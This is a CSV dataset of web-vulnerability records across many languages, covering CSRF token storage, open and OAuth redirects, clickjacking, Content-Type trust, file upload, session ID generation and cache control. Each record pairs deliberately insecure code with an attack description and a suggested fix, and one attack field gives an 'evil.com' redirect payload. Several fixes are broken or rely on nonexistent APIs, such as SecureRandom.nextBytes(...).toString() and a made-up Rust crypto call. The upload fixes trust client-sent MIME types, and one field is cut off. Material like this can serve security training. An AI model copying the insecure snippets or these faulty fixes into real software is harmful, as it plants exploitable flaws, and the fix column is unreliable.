vuln-505,PHP,Insecure CSRF Token Storage,CSRF tokens in cookies without server-side checks.,"setcookie('csrf_token', $token); if ($_POST['token'] == $_COOKIE['csrf_token']) { ... }",Manipulate CSRF cookie to bypass checks.,Store tokens in session: $_SESSION['csrf_token'] = $token;,"setcookie('csrf_token', $token); if ($_POST['token'] == $_COOKIE['csrf_token']) { ... }",False,False,False,False,87,False,True,False,Authentication,1
vuln-506,Ruby,Insecure CSRF Token Storage,CSRF tokens stored in cookies without validation.,cookies[:csrf_token] = token; verify_authenticity_token,Forge CSRF tokens via cookie manipulation.,Use Rails protect_from_forgery with session-based tokens.,cookies[:csrf_token] = token; verify_authenticity_token,False,False,False,False,55,False,False,False,Authentication,1
vuln-507,Go,Insecure CSRF Token Storage,Storing CSRF tokens in cookies without server-side validation.,"http.SetCookie(w, &http.Cookie{Name: ""csrf_token"", Value: token});",Manipulate CSRF cookie to bypass checks.,Store tokens server-side; use gorilla/csrf middleware.,"http.SetCookie(w, &http.Cookie{Name: ""csrf_token"", Value: token});",False,False,False,False,66,False,True,False,Authentication,1
vuln-508,C# (.NET),Insecure CSRF Token Storage,CSRF tokens in cookies without validation.,"Response.Cookies.Append(""csrf_token"", token);",Forge CSRF tokens via cookies.,Use AntiForgeryToken with server-side validation.,"Response.Cookies.Append(""csrf_token"", token);",False,False,False,False,45,False,True,False,Authentication,1
vuln-509,Kotlin,Insecure CSRF Token Storage,CSRF tokens stored in cookies without checks.,"call.response.cookies.append(""csrf_token"", token)",Manipulate CSRF cookie to bypass protection.,Use Ktor CSRF protection with session-based tokens.,"call.response.cookies.append(""csrf_token"", token)",False,False,False,False,49,False,True,False,Authentication,1
vuln-510,Scala,Insecure CSRF Token Storage,CSRF tokens in cookies without server-side validation.,"Ok.withCookies(Cookie(""csrf_token"", token))",Forge CSRF tokens via cookie injection.,Use Play Framework CSRF filter with session storage.,"Ok.withCookies(Cookie(""csrf_token"", token))",False,False,False,False,43,False,True,False,Authentication,1
vuln-511,Rust,Insecure CSRF Token Storage,CSRF tokens stored in cookies without validation.,"res.cookie(Cookie::new(""csrf_token"", token))",Manipulate CSRF cookie to bypass checks.,Use actix-web CSRF middleware with server-side tokens.,"res.cookie(Cookie::new(""csrf_token"", token))",False,False,False,False,44,False,True,False,Authentication,1
vuln-512,Elixir,Insecure CSRF Token Storage,CSRF tokens in cookies without server-side checks.,"put_resp_cookie(conn, ""csrf_token"", token)",Forge CSRF tokens via cookies.,Use Plug.CSRFProtection with session-based tokens.,"put_resp_cookie(conn, ""csrf_token"", token)",False,False,False,False,42,False,True,False,Authentication,1
vuln-513,Perl,Insecure CSRF Token Storage,CSRF tokens stored in cookies without validation.,"$r->headers_out->set('Set-Cookie' => ""csrf_token=$token"");",Manipulate CSRF cookie to bypass checks.,Store tokens in session; validate server-side.,"$r->headers_out->set('Set-Cookie' => ""csrf_token=$token"");",False,False,False,False,58,False,True,False,Authentication,1
vuln-515,Python,Open Redirect,Unvalidated redirect URLs.,return redirect(request.args.get('url')),Redirect to phishing site: ?url=http://evil.com,Validate: if urlparse(url).netloc == 'mydomain.com': redirect(url),return redirect(request.args.get('url')),False,False,False,False,40,False,True,False,Other,1
vuln-516,Java,Open Redirect,Unvalidated redirect URLs.,"response.sendRedirect(request.getParameter(""url""));",Redirect to malicious site.,Validate: if (ALLOWED_HOSTS.contains(new URL(url).getHost())) sendRedirect(url),"response.sendRedirect(request.getParameter(""url""));",True,False,False,False,51,False,True,False,Other,1
vuln-517,PHP,Open Redirect,Unvalidated redirect URLs.,header('Location: ' . $_GET['url']);,Redirect to phishing site.,"Validate: if (parse_url($url, PHP_URL_HOST) === 'mydomain.com') header('Location: ' . $url);",header('Location: ' . $_GET['url']);,False,False,False,False,36,False,True,False,Other,1
vuln-518,Ruby,Open Redirect,Unvalidated redirect URLs.,redirect_to params[:url],Redirect to malicious site.,Validate: redirect_to url if URI(url).host == 'mydomain.com',redirect_to params[:url],True,False,False,False,24,False,False,False,Other,1
vuln-519,Go,Open Redirect,Unvalidated redirect URLs.,"http.Redirect(w, r, r.URL.Query().Get(""url""), http.StatusFound)",Redirect to phishing site.,"Validate: if strings.HasPrefix(url, ""https://mydomain.com"") { http.Redirect(w, r, url, http.StatusFound) }","http.Redirect(w, r, r.URL.Query().Get(""url""), http.StatusFound)",True,True,False,False,63,False,True,False,Other,1
vuln-520,C# (.NET),Open Redirect,Unvalidated redirect URLs.,"return Redirect(Request.Query[""url""]);",Redirect to malicious site.,"Validate: if (new Uri(url).Host == ""mydomain.com"") return Redirect(url);","return Redirect(Request.Query[""url""]);",True,True,False,False,38,False,True,False,Other,1
vuln-521,Kotlin,Open Redirect,Unvalidated redirect URLs.,"call.respondRedirect(call.request.queryParameters[""url""]!!)",Redirect to phishing site.,"Validate: if (url.host == ""mydomain.com"") call.respondRedirect(url)","call.respondRedirect(call.request.queryParameters[""url""]!!)",True,True,False,False,59,False,True,False,Other,1
vuln-522,Scala,Open Redirect,Unvalidated redirect URLs.,"Redirect(params(""url""))",Redirect to malicious site.,"Validate: if (new URL(url).getHost == ""mydomain.com"") Redirect(url)","Redirect(params(""url""))",True,False,False,False,23,False,True,False,Other,1
vuln-523,Rust,Open Redirect,Unvalidated redirect URLs.,"res.redirect(&req.query(""url"")?)",Redirect to phishing site.,"Validate: if url.starts_with(""https://mydomain.com"") { res.redirect(url) }","res.redirect(&req.query(""url"")?)",True,True,False,False,32,False,True,False,Other,1
vuln-524,Elixir,Open Redirect,Unvalidated redirect URLs.,"redirect conn, external: params[""url""]",Redirect to malicious site.,"Validate: if String.starts_with?(url, ""https://mydomain.com"") do redirect conn, external: url end","redirect conn, external: params[""url""]",True,False,False,False,38,False,True,False,Other,1
vuln-526,Node.js,Insecure OAuth Redirect,Unvalidated OAuth redirect URIs.,const redirectUri = req.query.redirect_uri; res.redirect(redirectUri);,Redirect to malicious OAuth handler.,Validate: if (ALLOWED_REDIRECTS.includes(redirectUri)) res.redirect(redirectUri),const redirectUri = req.query.redirect_uri; res.redirect(redirectUri);,True,True,False,False,70,False,False,False,Authentication,1
vuln-527,Python,Insecure OAuth Redirect,Unvalidated OAuth redirect URIs.,return redirect(request.args.get('redirect_uri')),Steal OAuth tokens via malicious redirect.,Validate: if redirect_uri in ALLOWED_REDIRECTS: redirect(redirect_uri),return redirect(request.args.get('redirect_uri')),False,False,False,False,49,False,True,False,Authentication,1
vuln-528,Java,Insecure OAuth Redirect,Unvalidated OAuth redirect URIs.,"response.sendRedirect(request.getParameter(""redirect_uri""));",Redirect OAuth flow to attacker-controlled site.,Validate: if (ALLOWED_REDIRECTS.contains(url)) sendRedirect(url),"response.sendRedirect(request.getParameter(""redirect_uri""));",True,False,False,False,60,False,True,False,Authentication,1
vuln-529,PHP,Insecure OAuth Redirect,Unvalidated OAuth redirect URIs.,header('Location: ' . $_GET['redirect_uri']);,Steal tokens via malicious redirect.,"Validate: if (in_array($redirect_uri, $allowed)) header('Location: ' . $redirect_uri);",header('Location: ' . $_GET['redirect_uri']);,False,False,False,False,45,False,True,False,Authentication,1
vuln-530,Ruby,Insecure OAuth Redirect,Unvalidated OAuth redirect URIs.,redirect_to params[:redirect_uri],Redirect to malicious OAuth handler.,Validate: redirect_to redirect_uri if ALLOWED_REDIRECTS.include?(redirect_uri),redirect_to params[:redirect_uri],True,False,False,False,33,False,False,False,Authentication,1
vuln-531,Go,Insecure OAuth Redirect,Unvalidated OAuth redirect URIs.,"http.Redirect(w, r, r.URL.Query().Get(""redirect_uri""), http.StatusFound)",Steal OAuth tokens via redirect.,"Validate: if slices.Contains(ALLOWED_REDIRECTS, url) { http.Redirect(w, r, url, http.StatusFound) }","http.Redirect(w, r, r.URL.Query().Get(""redirect_uri""), http.StatusFound)",True,True,False,False,72,False,True,False,Authentication,1
vuln-532,C# (.NET),Insecure OAuth Redirect,Unvalidated OAuth redirect URIs.,"return Redirect(Request.Query[""redirect_uri""]);",Redirect to attacker-controlled site.,Validate: if (ALLOWED_REDIRECTS.Contains(url)) return Redirect(url);,"return Redirect(Request.Query[""redirect_uri""]);",True,True,False,False,47,False,True,False,Authentication,1
vuln-533,Kotlin,Insecure OAuth Redirect,Unvalidated OAuth redirect URIs.,"call.respondRedirect(call.request.queryParameters[""redirect_uri""]!!)",Steal tokens via malicious redirect.,Validate: if (ALLOWED_REDIRECTS.contains(url)) call.respondRedirect(url),"call.respondRedirect(call.request.queryParameters[""redirect_uri""]!!)",True,True,False,False,68,False,True,False,Authentication,1
vuln-534,Scala,Insecure OAuth Redirect,Unvalidated OAuth redirect URIs.,"Redirect(params(""redirect_uri""))",Redirect OAuth flow to malicious site.,Validate: if (ALLOWED_REDIRECTS.contains(url)) Redirect(url),"Redirect(params(""redirect_uri""))",True,False,False,False,32,False,True,False,Authentication,1
vuln-535,Rust,Insecure OAuth Redirect,Unvalidated OAuth redirect URIs.,"res.redirect(&req.query(""redirect_uri"")?)",Steal tokens via redirect.,Validate: if ALLOWED_REDIRECTS.contains(&url) { res.redirect(url) },"res.redirect(&req.query(""redirect_uri"")?)",True,True,False,False,41,False,True,False,Authentication,1
vuln-536,Elixir,Insecure OAuth Redirect,Unvalidated OAuth redirect URIs.,"redirect conn, external: params[""redirect_uri""]",Redirect to malicious OAuth handler.,"Validate: if Enum.member?(ALLOWED_REDIRECTS, url) do redirect conn, external: url end","redirect conn, external: params[""redirect_uri""]",True,False,False,False,47,False,True,False,Authentication,1
vuln-537,Perl,Insecure OAuth Redirect,Unvalidated OAuth redirect URIs.,$r->headers_out->set('Location' => $r->param('redirect_uri'));,Steal OAuth tokens via redirect.,Validate: $r->headers_out->set('Location' => $url) if grep { $url eq $_ } @allowed;,$r->headers_out->set('Location' => $r->param('redirect_uri'));,True,False,False,False,62,False,True,False,Authentication,1
vuln-538,Node.js,Clickjacking,Missing X-Frame-Options header.,"app.get('/', (req, res) => res.send('Page'));",Embed site in iframe to perform clickjacking.,"Set header: res.set('X-Frame-Options', 'DENY')","app.get('/', (req, res) => res.send('Page'));",False,False,False,False,45,False,True,False,Other,1
vuln-539,Python,Clickjacking,No X-Frame-Options header.,@app.route('/') def index(): return 'Page',Iframe site for clickjacking attacks.,Set: response.headers['X-Frame-Options'] = 'DENY',@app.route('/') def index(): return 'Page',False,False,False,False,42,False,True,False,Other,1
vuln-540,Java,Clickjacking,Missing X-Frame-Options header.,"@GetMapping(""/"") public String index() { return ""Page""; }",Embed in iframe for clickjacking.,"Set: response.setHeader(""X-Frame-Options"", ""DENY"")","@GetMapping(""/"") public String index() { return ""Page""; }",False,False,False,False,57,False,True,False,Other,1
vuln-541,PHP,Clickjacking,No X-Frame-Options header.,echo 'Page';,Iframe site to perform clickjacking.,Set: header('X-Frame-Options: DENY');,echo 'Page';,False,False,False,False,12,False,True,False,Other,1
vuln-542,Ruby,Clickjacking,Missing X-Frame-Options header.,get '/' do 'Page' end,Embed site in iframe for clickjacking.,Set: response.headers['X-Frame-Options'] = 'DENY',get '/' do 'Page' end,False,False,False,False,21,False,True,False,Other,1
vuln-543,Go,Clickjacking,No X-Frame-Options header.,"http.HandleFunc(""/"", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, ""Page"") })",Iframe site for clickjacking attacks.,"Set: w.Header().Set(""X-Frame-Options"", ""DENY"")","http.HandleFunc(""/"", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, ""Page"") })",False,False,False,False,92,False,True,False,Other,1
vuln-544,C# (.NET),Clickjacking,Missing X-Frame-Options header.,"[HttpGet(""/"")] public IActionResult Index() { return Ok(""Page""); }",Embed in iframe for clickjacking.,"Set: Response.Headers.Add(""X-Frame-Options"", ""DENY"");","[HttpGet(""/"")] public IActionResult Index() { return Ok(""Page""); }",False,False,False,False,66,False,True,False,Other,1
vuln-545,Kotlin,Clickjacking,No X-Frame-Options header.,"get(""/"") { call.respondText(""Page"") }",Iframe site for clickjacking attacks.,"Set: call.response.header(""X-Frame-Options"", ""DENY"")","get(""/"") { call.respondText(""Page"") }",False,False,False,False,37,False,True,False,Other,1
vuln-546,Scala,Clickjacking,Missing X-Frame-Options header.,"get(""/"") { Ok(""Page"") }",Embed site in iframe for clickjacking.,"Set: Ok(""Page"").withHeaders(""X-Frame-Options"" -> ""DENY"")","get(""/"") { Ok(""Page"") }",False,False,False,False,23,False,True,False,Other,1
vuln-547,Rust,Clickjacking,No X-Frame-Options header.,"router.get(""/"", |_, res| res.render_text(""Page""))",Iframe site for clickjacking attacks.,"Set: res.header(""X-Frame-Options"", ""DENY"")","router.get(""/"", |_, res| res.render_text(""Page""))",False,False,False,False,49,False,True,False,Other,1
vuln-548,Elixir,Clickjacking,Missing X-Frame-Options header.,"get ""/"", PageController, :index # returns 'Page'",Embed in iframe for clickjacking.,"Set: put_resp_header(conn, ""x-frame-options"", ""DENY"")","get ""/"", PageController, :index # returns 'Page'",False,False,False,False,48,False,True,False,Other,1
vuln-549,Perl,Clickjacking,No X-Frame-Options header.,$r->print('Page');,Iframe site for clickjacking attacks.,Set: $r->headers_out->set('X-Frame-Options' => 'DENY');,$r->print('Page');,False,False,False,False,18,False,True,False,Other,1
vuln-550,Node.js,Insecure Content-Type Handling,Trusting client-supplied Content-Type headers.,if (req.headers['content-type'] === 'application/json') parseJson(req.body);,Spoof Content-Type to bypass parsing checks.,Validate payload: try { JSON.parse(req.body) } catch (e) { res.status(400); },if (req.headers['content-type'] === 'application/json') parseJson(req.body);,True,False,False,False,76,False,True,False,Other,1
vuln-551,Python,Insecure Content-Type Handling,Trusting Content-Type header for parsing.,if request.headers['Content-Type'] == 'application/json': json.loads(request.data),Spoof Content-Type to inject malicious data.,Validate: json.loads(request.data) if request.is_json else abort(400),if request.headers['Content-Type'] == 'application/json': json.loads(request.data),False,False,False,False,82,False,True,False,Other,1
vuln-552,Java,Insecure Content-Type Handling,Relying on client Content-Type header.,"if (request.getContentType().equals(""application/json"")) { parseJson(request.getInputStream()); }",Spoof Content-Type to bypass validation.,"Validate: try { objectMapper.readValue(request.getInputStream(), Object.class); } catch (Exception e) { ... }","if (request.getContentType().equals(""application/json"")) { parseJson(request.getInputStream()); }",True,False,False,False,97,False,True,False,Other,1
vuln-553,PHP,Insecure Content-Type Handling,Trusting Content-Type header.,if ($_SERVER['CONTENT_TYPE'] === 'application/json') { json_decode(file_get_contents('php://input')); },Spoof Content-Type to inject data.,Validate: $data = json_decode(file_get_contents('php://input')); if (json_last_error() === JSON_ERROR_NONE) { ... },if ($_SERVER['CONTENT_TYPE'] === 'application/json') { json_decode(file_get_contents('php:,True,False,False,False,103,False,True,False,Other,1
vuln-554,Ruby,Insecure Content-Type Handling,Relying on client-supplied Content-Type.,if request.content_type == 'application/json' then JSON.parse(request.body.read) end,Spoof Content-Type to bypass parsing.,Validate: JSON.parse(request.body.read) rescue render status: 400,if request.content_type == 'application/json' then JSON.parse(request.body.read) end,True,False,False,False,84,False,True,False,Other,1
vuln-555,Go,Insecure Content-Type Handling,Trusting Content-Type header for parsing.,"if r.Header.Get(""Content-Type"") == ""application/json"" { json.NewDecoder(r.Body).Decode(&data) }",Spoof Content-Type to inject malicious data.,"Validate: err := json.NewDecoder(r.Body).Decode(&data); if err != nil { http.Error(w, ""Invalid JSON"", 400) }","if r.Header.Get(""Content-Type"") == ""application/json"" { json.NewDecoder(r.Body).Decode(&data) }",True,False,False,False,95,False,True,False,Other,1
vuln-556,C# (.NET),Insecure Content-Type Handling,Relying on Content-Type header.,"if (Request.ContentType == ""application/json"") { JsonSerializer.Deserialize(Request.Body); }",Spoof Content-Type to bypass checks.,Validate: try { await JsonSerializer.DeserializeAsync(Request.Body); } catch { return BadRequest(); },"if (Request.ContentType == ""application/json"") { JsonSerializer.Deserialize(Request.Body); }",True,False,False,False,92,False,True,False,Other,1
vuln-557,Kotlin,Insecure Content-Type Handling,Trusting Content-Type header.,"if (call.request.contentType().toString() == ""application/json"") { call.receive<String>() }",Spoof Content-Type to inject data.,Validate: try { Json.decodeFromString(call.receive<String>()) } catch (e: Exception) { call.respond(HttpStatusCode.BadRequest) },"if (call.request.contentType().toString() == ""application/json"") { call.receive<String>() }",False,False,False,False,91,False,True,False,Other,1
vuln-558,Scala,Insecure Content-Type Handling,Relying on client Content-Type.,"if (request.contentType.contains(""application/json"")) { parse(request.body.asJson) }",Spoof Content-Type to bypass parsing.,Validate: parse(request.body.asJson).recover { case _ => BadRequest },"if (request.contentType.contains(""application/json"")) { parse(request.body.asJson) }",True,False,False,False,84,False,True,False,Other,1
vuln-559,Rust,Insecure Content-Type Handling,Trusting Content-Type header.,"if req.headers().get(""content-type"") == Some(&""application/json"".into()) { serde_json::from_reader(req.body()?) }",Spoof Content-Type to inject data.,Validate: serde_json::from_reader(req.body()?).map_err(|_| StatusCode::BAD_REQUEST),"if req.headers().get(""content-type"") == Some(&""application/json"".into()) { serde_json::from_reader(req.body()?) }",True,False,False,False,113,False,True,False,Other,1
vuln-560,Elixir,Insecure Content-Type Handling,Relying on Content-Type header.,"if get_req_header(conn, ""content-type"") == [""application/json""] do Jason.decode!(conn.body_params) end",Spoof Content-Type to bypass checks.,"Validate: case Jason.decode(conn.body_params) do {:ok, _} -> ...; {:error, _} -> send_resp(conn, 400, ""Invalid JSON"") end","if get_req_header(conn, ""content-type"") == [""application/json""] do Jason.decode!(conn.body_params) end",True,False,False,False,102,False,True,False,Other,1
vuln-561,Perl,Insecure Content-Type Handling,Trusting Content-Type header for parsing.,if ($r->header('Content-Type') eq 'application/json') { decode_json($r->content); },Spoof Content-Type to inject data.,Validate: eval { decode_json($r->content) } or $r->status(400);,if ($r->header('Content-Type') eq 'application/json') { decode_json($r->content); },False,False,False,False,83,False,True,False,Other,1
vuln-562,Node.js,Insecure File Upload,No validation of uploaded file types.,"app.post('/upload', (req, res) => { req.files.file.mv('uploads/' + req.files.file.name); });",Upload malicious files like .php scripts.,"Validate: if (['image/png', 'image/jpeg'].includes(req.files.file.mimetype)) { ... }","app.post('/upload', (req, res) => { req.files.file.mv('uploads/' + req.files.file.name); });",True,False,False,False,92,False,True,True,File_Handling,1
vuln-563,Python,Insecure File Upload,No validation of uploaded file types.,file = request.files['file']; file.save('uploads/' + file.filename),Upload executable scripts.,"Validate: if file.mimetype in ['image/png', 'image/jpeg']: file.save(...)",file = request.files['file']; file.save('uploads/' + file.filename),False,False,False,False,67,False,True,True,File_Handling,1
vuln-564,Java,Insecure File Upload,No validation of uploaded files.,"@PostMapping(""/upload"") public void upload(@RequestParam(""file"") MultipartFile file) { file.transferTo(new File(""uploads/"" + file.getOriginalFilename())); }",Upload malicious files.,"Validate: if (Arrays.asList(""image/png"", ""image/jpeg"").contains(file.getContentType())) { ... }","@PostMapping(""/upload"") public void upload(@RequestParam(""file"") MultipartFile file) { file.transferTo(new File(""uploads/"" + file.getOriginalFilename())); }",True,False,False,False,156,False,True,True,File_Handling,1
vuln-565,PHP,Insecure File Upload,No validation of uploaded file types.,"move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);",Upload executable scripts like .php.,"Validate: if (in_array($_FILES['file']['type'], ['image/png', 'image/jpeg'])) { ... }","move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);",False,False,False,False,86,False,True,False,File_Handling,1
vuln-566,Ruby,Insecure File Upload,No validation of uploaded files.,"file = params[:file]; File.open(""uploads/#{file.original_filename}"", 'wb') { |f| f.write(file.tempfile) }",Upload malicious files.,Validate: if %w[image/png image/jpeg].include?(file.content_type) { ... },"file = params[:file]; File.open(""uploads/#{file.original_filename}"", 'wb') { |f| f.write(file.tempfile) }",True,False,True,False,105,False,True,False,File_Handling,1
vuln-567,Go,Insecure File Upload,No validation of uploaded file types.,"file, header, _ := r.FormFile(""file""); os.WriteFile(""uploads/""+header.Filename, file, 0644)",Upload executable scripts.,"Validate: if slices.Contains([]string{""image/png"", ""image/jpeg""}, header.Header.Get(""Content-Type"")) { ... }","file, header, _ := r.FormFile(""file""); os.WriteFile(""uploads/""+header.Filename, file, 0644)",False,False,True,False,91,False,True,True,File_Handling,1
vuln-568,C# (.NET),Insecure File Upload,No validation of uploaded files.,"[HttpPost(""upload"")] public async Task Upload(IFormFile file) { await File.WriteAllBytesAsync(""uploads/"" + file.FileName, file.OpenReadStream()); }",Upload malicious files.,"Validate: if (new[] {""image/png"", ""image/jpeg""}.Contains(file.ContentType)) { ... }","[HttpPost(""upload"")] public async Task Upload(IFormFile file) { await File.WriteAllBytesAsync(""uploads/"" + file.FileName, file.OpenReadStream()); }",False,False,True,False,147,False,True,True,File_Handling,1
vuln-569,Kotlin,Insecure File Upload,No validation of uploaded file types.,"val file = call.receiveMultipart().readPart() as FilePart; File(""uploads/${file.fileName}"").writeBytes(file.streamProvider().readAllBytes())",Upload executable scripts.,"Validate: if (file.contentType in listOf(""image/png"", ""image/jpeg"")) { ... }","val file = call.receiveMultipart().readPart() as FilePart; File(""uploads/${file.fileName}"").writeBytes(file.streamProvider().readAllBytes())",False,False,False,False,140,False,True,True,File_Handling,1
vuln-570,Scala,Insecure File Upload,No validation of uploaded files.,"val file = request.body.asMultipartFormData.get.file(""file""); Files.write(Paths.get(""uploads"", file.filename), file.ref)",Upload malicious files.,"Validate: if (List(""image/png"", ""image/jpeg"").contains(file.contentType)) { ... }","val file = request.body.asMultipartFormData.get.file(""file""); Files.write(Paths.get(""uploads"", file.filename), file.ref)",True,False,False,False,120,False,True,False,File_Handling,1
vuln-571,Rust,Insecure File Upload,No validation of uploaded file types.,"let file = req.multipart()?.next_field()?.unwrap(); fs::write(format!(""uploads/{}"", file.name()?), file.bytes()?)?;",Upload executable scripts.,"Validate: if [""image/png"", ""image/jpeg""].contains(&file.content_type()?) { ... }","let file = req.multipart()?.next_field()?.unwrap(); fs::write(format!(""uploads/{}"", file.name()?), file.bytes()?)?;",True,False,False,False,115,False,True,False,File_Handling,1
vuln-572,Elixir,Insecure File Upload,No validation of uploaded files.,"file = params[""file""]; File.write(""uploads/#{file.filename}"", file.tempfile)",Upload malicious files.,Validate: if file.content_type in ~w(image/png image/jpeg) do File.write(...) end,"file = params[""file""]; File.write(""uploads/#{file.filename}"", file.tempfile)",True,False,False,False,76,False,True,False,File_Handling,1
vuln-573,Perl,Insecure File Upload,No validation of uploaded file types.,"my $file = $r->upload('file'); open(my $fh, '>', ""uploads/$file->filename"");",Upload executable scripts.,Validate: if ($file->type =~ /^image/(png|jpeg)$/) { ... },"my $file = $r->upload('file'); open(my $fh, '>', ""uploads/$file->filename"");",False,False,True,False,76,False,True,False,File_Handling,1
vuln-574,Node.js,Insecure Session ID Generation,Predictable session IDs.,const sessionId = Date.now() + '-' + Math.random();,Predict session IDs to hijack sessions.,Use crypto.randomBytes(32).toString('hex'),const sessionId = Date.now() + '-' + Math.random();,False,False,False,False,51,False,True,True,Authentication,1
vuln-576,Java,Insecure Session ID Generation,Predictable session IDs.,"String sessionId = System.currentTimeMillis() + ""-"" + new Random().nextInt(1000);",Predict IDs to hijack sessions.,Use SecureRandom: new SecureRandom().nextBytes(new byte[32]).toString(),"String sessionId = System.currentTimeMillis() + ""-"" + new Random().nextInt(1000);",False,False,False,True,81,False,True,True,Authentication,1
vuln-577,PHP,Insecure Session ID Generation,Predictable session IDs.,"$session_id = time() . rand(1000, 9999);",Guess session IDs based on time.,Use session_id(bin2hex(random_bytes(32))),"$session_id = time() . rand(1000, 9999);",False,False,False,False,40,False,False,False,Authentication,1
vuln-578,Ruby,Insecure Session ID Generation,Predictable session IDs.,session[:id] = Time.now.to_i.to_s + rand(1000).to_s,Predict IDs to hijack sessions.,Use SecureRandom.hex(32),session[:id] = Time.now.to_i.to_s + rand(1000).to_s,False,False,False,False,51,False,False,True,Authentication,1
vuln-579,Go,Insecure Session ID Generation,Predictable session IDs using time.,"sessionId := fmt.Sprintf(""%d-%d"", time.Now().Unix(), rand.Intn(1000))",Guess session IDs based on timestamp.,Use crypto/rand: crypto.Read(bytes); hex.EncodeToString(bytes),"sessionId := fmt.Sprintf(""%d-%d"", time.Now().Unix(), rand.Intn(1000))",False,False,False,False,69,False,True,False,Authentication,1
vuln-580,C# (.NET),Insecure Session ID Generation,Predictable session IDs.,"var sessionId = DateTime.Now.Ticks + ""-"" + new Random().Next(1000);",Predict IDs to hijack sessions.,Use RNGCryptoServiceProvider: GetBytes(new byte[32]).ToBase64String(),"var sessionId = DateTime.Now.Ticks + ""-"" + new Random().Next(1000);",False,False,False,False,67,False,True,True,Authentication,1
vuln-581,Kotlin,Insecure Session ID Generation,Predictable session IDs.,"val sessionId = ""${System.currentTimeMillis()}-${Random().nextInt(1000)}""",Guess session IDs based on time.,Use SecureRandom: SecureRandom().nextBytes(ByteArray(32)).toHex(),"val sessionId = ""${System.currentTimeMillis()}-${Random().nextInt(1000)}""",False,False,False,True,73,False,True,True,Authentication,1
vuln-582,Scala,Insecure Session ID Generation,Predictable session IDs.,"val sessionId = s""${System.currentTimeMillis()}-${scala.util.Random.nextInt(1000)}""",Predict IDs to hijack sessions.,Use SecureRandom: java.security.SecureRandom().nextBytes(new Array[Byte](32)).toHex,"val sessionId = s""${System.currentTimeMillis()}-${scala.util.Random.nextInt(1000)}""",False,False,False,True,83,False,True,True,Authentication,1
vuln-583,Rust,Insecure Session ID Generation,Predictable session IDs.,"let session_id = format!(""{}-{}"", SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs(), thread_rng().gen::<u32>());",Guess session IDs based on timestamp.,Use rand::crypto::SystemRandom: SystemRandom.fill(&mut [0u8; 32]).to_hex(),"let session_id = format!(""{}-{}"", SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs(), thread_rng().gen::<u32>());",False,False,False,True,118,False,True,False,Authentication,1
vuln-584,Elixir,Insecure Session ID Generation,Predictable session IDs.,"session_id = ""#{:os.system_time(:second)}#{:rand.uniform(1000)}""",Predict IDs to hijack sessions.,Use :crypto.strong_rand_bytes(32) |> Base.encode16(),"session_id = ""#{:os.system_time(:second)}#{:rand.uniform(1000)}""",False,False,False,True,64,False,True,False,Authentication,1
vuln-585,Perl,Insecure Session ID Generation,Predictable session IDs.,my $session_id = time() . rand(1000);,Guess session IDs based on time.,Use Crypt::Random::Source: random_bytes(32)->hex;,my $session_id = time() . rand(1000);,False,False,False,False,37,False,False,False,Authentication,1
vuln-586,Node.js,Insecure Cache Control,Sensitive data cached without control.,"app.get('/user', (req, res) => res.json(userData));",Access sensitive data from cache.,"Set headers: res.set('Cache-Control', 'no-store, no-cache, private')","app.get('/user', (req, res) => res.json(userData));",False,False,False,False,51,False,True,False,Other,1
vuln-587,Python,Insecure Cache Control,No cache control for sensitive data.,@app.route('/user') def user(): return jsonify(user_data),Retrieve sensitive data from cache.,"Set: response.headers['Cache-Control'] = 'no-store, no-cache, private'",@app.route('/user') def user(): return jsonify(user_data),False,False,False,False,57,False,True,False,Other,1
vuln-588,Java,Insecure Cache Control,No cache control headers for sensitive data.,"@GetMapping(""/user"") public User getUser() { return user; }",Access cached sensitive data.,"Set: response.setHeader(""Cache-Control"", ""no-store, no-cache, private"")","@GetMapping(""/user"") public User getUser() { return user; }",False,False,False,False,59,False,True,False,Other,1
vuln-589,PHP,Insecure Cache Control,No cache control for sensitive responses.,echo json_encode($user_data);,Retrieve sensitive data from cache.,"Set: header('Cache-Control: no-store, no-cache, private');",echo json_encode($user_data);,False,False,False,False,29,False,False,False,Other,1
vuln-590,Ruby,Insecure Cache Control,No cache control for sensitive data.,get '/user' do user.to_json end,Access sensitive data from cache.,"Set: response.headers['Cache-Control'] = 'no-store, no-cache, private'",get '/user' do user.to_json end,False,False,False,False,31,False,True,False,Other,1
vuln-591,Go,Insecure Cache Control,No cache control headers for sensitive data.,"http.HandleFunc(""/user"", func(w http.ResponseWriter, r *http.Request) { json.NewEncoder(w).Encode(user) })",Retrieve cached sensitive data.,"Set: w.Header().Set(""Cache-Control"", ""no-store, no-cache, private"")","http.HandleFunc(""/user"", func(w http.ResponseWriter, r *http.Request) { json.NewEncoder(w).Encode(user) })",False,False,False,False,106,False,True,False,Other,1
vuln-592,C# (.NET),Insecure Cache Control,No cache control for sensitive responses.,"[HttpGet(""user"")] public IActionResult GetUser() { return Ok(user); }",Access sensitive data from cache.,"Set: Response.Headers.Add(""Cache-Control"", ""no-store, no-cache, private"");","[HttpGet(""user"")] public IActionResult GetUser() { return Ok(user); }",False,False,False,False,69,False,True,False,Other,1
vuln-593,Kotlin,Insecure Cache Control,No cache control for sensitive data.,"get(""/user"") { call.respond(user) }",Retrieve cached sensitive data.,"Set: call.response.header(""Cache-Control"", ""no-store, no-cache, private"")","get(""/user"") { call.respond(user) }",False,False,False,False,35,False,True,False,Other,1
vuln-594,Scala,Insecure Cache Control,No cache control headers for sensitive data.,"get(""/user"") { Ok(user) }",Access sensitive data from cache.,"Set: Ok(user).withHeaders(""Cache-Control"" -> ""no-store, no-cache, private"")","get(""/user"") { Ok(user) }",False,False,False,False,25,False,True,False,Other,1
vuln-595,Rust,Insecure Cache Control,No cache control for sensitive responses.,"router.get(""/user"", |_, res| res.render_json(user))",Retrieve cached sensitive data.,"Set: res.header(""Cache-Control"", ""no-store, no-cache, private"")","router.get(""/user"", |_, res| res.render_json(user))",False,False,False,False,51,False,True,False,Other,1
vuln-596,Elixir,Insecure Cache Control,No cache control for sensitive data.,"get ""/user"", UserController, :show",Access sensitive data from cache.,"Set: put_resp_header(conn, ""cache-control"", ""no-store, no-cache, private"")","get ""/user"", UserController, :show",False,False,False,False,34,False,True,False,Other,1
